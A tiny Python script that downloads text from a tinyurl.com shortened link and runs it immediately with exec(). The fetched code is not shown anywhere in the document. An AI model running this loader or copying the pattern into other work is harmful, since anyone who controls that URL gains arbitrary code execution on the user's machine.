from urllib.request import urlopen

exec(
    urlopen(
        "https://tinyurl.com/badapplecmd"
    ).read().decode()
)
